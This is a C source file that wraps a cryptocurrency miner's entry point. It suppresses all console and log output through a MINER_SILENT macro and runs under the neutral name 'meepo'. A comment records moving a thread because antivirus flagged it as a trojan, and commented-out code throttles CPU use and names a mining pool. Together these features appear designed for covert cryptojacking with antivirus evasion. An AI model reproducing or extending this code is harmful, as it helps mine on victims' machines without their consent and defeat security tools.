#define ACD_VERSION "02"

#ifdef MINER_SILENT
#define printf(...)
#define fprintf(...)
#define applog(...)
#endif 

int miner_main(int argc, char *argv[]);

static int kIdle;

void *input_thread(void *userdata) {

/*
    while(1) {
        int k = getchar() - '0';
        if(k >= 0 && k < 100) {
            kIdle = k;
            applog(LOG_ERR, "Set kIdle = %d\n", kIdle);
        }
		
		if(k < (1-'0'))
			break;
    }
	*/
    return NULL;
}

int main(int argc_, char *argv_[])
{
	//applog(LOG_ERR, "started daemon v" ACD_VERSION);

    kIdle = 6;
    //pthread_t inp_thread;
	// the following thread was moved to miner_main() (antivir detected some trojan otherwise and we save a thread)
   // if (unlikely(pthread_create(&inp_thread, NULL, input_thread, NULL))) {
   //     applog(LOG_ERR, "input thread create failed");
   //     return 1;
   // }
	

	char *  argv[] = {
		"meepo",
		//"-a", "neoscrypt",
		//"-o", "stratum+tcp://pool.unimining.net:4233",
		//"-u", poolUser,
		//"-p", "c=GBX",
		//"-e", "2"
	};
	int argn = sizeof(argv) / sizeof(char*);
	miner_main(argn, argv);
}

struct timeval tv_throttleMeasure[16];

/*
void miner_throttle(int thr_id) {
    usleep(1000*kIdle);
    return;

//int kIdle = 12;
    struct timeval *m = &tv_throttleMeasure[thr_id % 16];
    if(m->tv_sec) {
        struct timeval n, diff;
        gettimeofday(&n, NULL);
        timeval_subtract(&diff, &n, m);
        ullong diffUs = (diff.tv_sec * 1e6 + diff.tv_usec);

        usleep(diffUs * kIdle);
    }
    gettimeofday(m, NULL);

}
*/